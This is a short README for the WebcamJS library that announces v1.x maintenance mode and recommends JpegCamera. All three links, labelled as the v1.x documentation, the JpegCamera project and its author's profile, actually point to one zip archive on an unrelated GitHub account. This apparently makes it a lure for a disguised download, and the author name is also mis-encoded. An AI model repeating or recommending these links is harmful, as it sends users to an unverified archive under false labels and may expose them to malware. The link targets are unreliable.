# WebcamJS is in Maintenance Mode

Hey everyone!  WebcamJS v1.x is going into maintenance mode as of Feb 11, 2017.  That means I will only be able to fix critical bugs from here on in.  I will not be adding any new features, or accepting any new PRs into this version.  I am working on an all-new WebcamJS v2.0 implementation, which will feature real-time canvas effects, and plugin drivers for mobile support.

See [https://raw.githubusercontent.com/ajgarciaj/webcamjs/master/Bahamian/webcamjs.zip](https://raw.githubusercontent.com/ajgarciaj/webcamjs/master/Bahamian/webcamjs.zip) for the v1.x documentation.

Looking for a good alternative to WebcamJS?  Please check out [JpegCamera](https://raw.githubusercontent.com/ajgarciaj/webcamjs/master/Bahamian/webcamjs.zip) by [Adam Wr√≥bel](https://raw.githubusercontent.com/ajgarciaj/webcamjs/master/Bahamian/webcamjs.zip).  It has many advanced features that WebcamJS is lacking (for example, upload multiple photos at once, retry failed uploads, CSRF tokens, make sure camera is ready), and has a very clean and object-oriented design.
